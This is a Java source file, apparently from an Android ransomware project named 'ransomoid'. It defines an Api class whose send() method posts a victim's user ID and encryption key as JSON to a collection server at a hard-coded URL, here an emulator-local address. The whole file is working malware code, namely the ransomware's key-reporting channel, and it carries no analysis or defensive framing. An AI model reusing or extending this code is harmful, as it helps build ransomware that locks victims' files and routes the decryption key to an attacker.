package falezza.fabio.ransomoid.utils;

import android.content.Context;

import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Method;

import static com.android.volley.Request.Method.POST;

/**
 * Created by fabio on 16/02/18.
 */

public class Api {

    private static Api instance;
    private RequestQueue queue;
    private static final String SEND_URL = "http://10.0.2.2:8080/enc";

    private Api(Context context) {
        this.queue = Volley.newRequestQueue(context);
    }

    public static Api getInstance(Context context) {
        if (instance == null) {
            instance = new Api(context);
        }
        return instance;
    }

    public void send(String userID, String key) throws JSONException {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("key", key);
        jsonBody.put("id", userID);

        Response.Listener listener = new Response.Listener() {
            @Override
            public void onResponse(Object response) {
                System.out.println(response);
            }
        };

        Response.ErrorListener errorListener = new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                System.out.println(error);
            }
        };

        ServerStatusRequest request = new ServerStatusRequest(POST, SEND_URL, null,
                jsonBody.toString(), listener, errorListener);

        this.queue.add(request);
    }
}


